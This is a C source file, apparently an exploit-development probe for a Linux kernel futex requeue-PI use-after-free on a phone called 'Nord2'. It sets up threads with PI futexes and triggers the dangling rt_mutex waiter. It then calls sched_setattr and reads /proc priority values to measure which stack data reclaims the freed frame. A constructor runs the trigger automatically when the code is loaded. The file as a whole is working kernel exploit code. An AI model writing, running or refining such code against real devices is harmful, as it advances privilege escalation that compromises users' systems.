/*
 * Measure the actual rt_mutex_waiter stack position on Nord2.
 * 
 * Strategy: after the UAF fires (pi_blocked_on dangling), use sched_setattr
 * to trigger rt_mutex_adjust_prio_chain. The waiter->prio field tells us
 * what value was at that stack offset. By filling the stack with a known
 * pattern (via different syscalls) and checking which pattern value appears
 * as "prio", we can find which syscall/offset reclaims the freed frame.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/futex.h>
#include <time.h>
#include <errno.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_sched_setattr
#define SYS_sched_setattr 274
#endif

struct my_sched_attr {
    uint32_t size, sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime, sched_deadline, sched_period;
};

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0, g_route_done=0;

static int get_prio(pid_t tid) {
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

void *owner_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while (!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    for(;;) sleep(1);
    return NULL;
}

void *waiter_fn(void *_) {
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while (!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=30;
    atomic_store(&g_waiting,1);
    /* UAF trigger */
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);
    /* Stack freed here. Now do various syscalls and measure prio change */
    atomic_store(&g_route_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while (!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void) {
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== Measuring waiter stack position ===\n");
    fprintf(stderr,"[*] Strategy: trigger UAF, then try different syscalls\n");
    fprintf(stderr,"[*] The prio value after sched_setattr tells us what's at waiter->prio offset\n\n");
    
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    
    f_wait=0; f_pi_target=0; f_pi_chain=0;
    atomic_store(&g_tid,0); atomic_store(&g_ready,0); atomic_store(&g_waiting,0);
    atomic_store(&g_owner_started,0); atomic_store(&g_owner_done,0); atomic_store(&g_route_done,0);
    
    pthread_t ot,wt;
    pthread_create(&ot,NULL,owner_fn,NULL);
    pthread_create(&wt,NULL,waiter_fn,NULL);
    
    while (!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
    usleep(10000);
    
    /* Trigger requeue → -EDEADLK → UAF */
    syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
    
    /* Wait for waiter to exit futex */
    while (!atomic_load(&g_route_done)) usleep(500);
    usleep(5000); /* let it settle */
    
    pid_t tid=(pid_t)atomic_load(&g_tid);
    int prio_baseline = get_prio(tid);
    fprintf(stderr,"[*] Prio baseline (after UAF, no spray): %d\n", prio_baseline);
    
    /* Now trigger sched_setattr to walk the dangling pi_blocked_on */
    struct my_sched_attr a={.size=sizeof(a),.sched_nice=19};
    syscall(SYS_sched_setattr,(long)tid,&a,0UL);
    usleep(1000);
    
    int prio_after = get_prio(tid);
    fprintf(stderr,"[*] Prio after sched_setattr trigger: %d\n", prio_after);
    fprintf(stderr,"[*] prio=%d: RT prio %d (stack value at waiter->prio offset)\n",
            prio_after, prio_after < 0 ? -(prio_after+1) : 0);
    
    return 0;
}

__attribute__((constructor)) static void _init(void) { main(); }
